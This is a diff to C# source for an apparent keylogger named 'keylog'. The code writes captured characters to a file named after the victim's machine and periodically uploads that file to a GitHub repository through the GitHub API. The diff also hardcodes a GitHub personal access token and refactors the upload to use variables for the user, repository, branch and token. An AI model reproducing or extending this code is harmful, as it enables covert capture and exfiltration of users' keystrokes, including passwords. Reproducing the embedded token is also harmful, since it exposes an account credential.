@@ -13,6 +13,7 @@ namespace keylog
         static void Main(string[] args)
         {
 
+
             string computer = Environment.MachineName;
             string fileName = computer + ".txt";
             string path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "/" + fileName;
@@ -57,30 +58,39 @@ namespace keylog
         static void write(string tmp, string path, string computer, int count)
         {
             tmp = tmp.Substring(tmp.Length - 1);
-            tmp = "";
-            if (count > 10)
+            
+            if (count > 40)
             {
                 File.AppendAllText(path, tmp);
+                System.Threading.Thread.Sleep(1000);
                 upload(path, computer);
                 count = 0;
             }
+            tmp = "";
         }
         static async void upload(string path, string computer)
         {
-                var gitHubClient = new GitHubClient(new ProductHeaderValue("keylog"));
-                gitHubClient.Credentials = new Credentials("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");
+            //put github credentials here
+            string githubUser = "Stalinisator";
+            string githubRepo = "keylog";
+            string githubBranch = "main";
+            string githubToken = "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";
+
+
+            var gitHubClient = new GitHubClient(new ProductHeaderValue(githubRepo));
+                gitHubClient.Credentials = new Credentials(githubToken);
             try
             {
-                var fileDetails = await gitHubClient.Repository.Content.GetAllContentsByRef("Stalinisator", "keylog",
-                computer, "main");
-                var updateChangeSet = gitHubClient.Repository.Content.UpdateFile("Stalinisator", "keylog", computer,
-                new UpdateFileRequest($"commit for {computer}", File.ReadAllText(path), fileDetails.First().Sha, "main"));
+                var fileDetails = await gitHubClient.Repository.Content.GetAllContentsByRef(githubUser, githubRepo,
+                computer, githubBranch);
+                var updateChangeSet = gitHubClient.Repository.Content.UpdateFile(githubUser, githubRepo, computer,
+                new UpdateFileRequest($"commit for {computer}", File.ReadAllText(path), fileDetails.First().Sha, githubBranch));
             }
             catch (Exception e)
             {
                 var fileDetails = gitHubClient.Repository.Content.CreateFile(
-                "Stalinisator", "keylog", computer,
-                new CreateFileRequest($"commit for {computer}", File.ReadAllText(path), "main"));
+                githubUser, githubRepo, computer,
+                new CreateFileRequest($"commit for {computer}", File.ReadAllText(path), githubBranch));
             }
 
         }
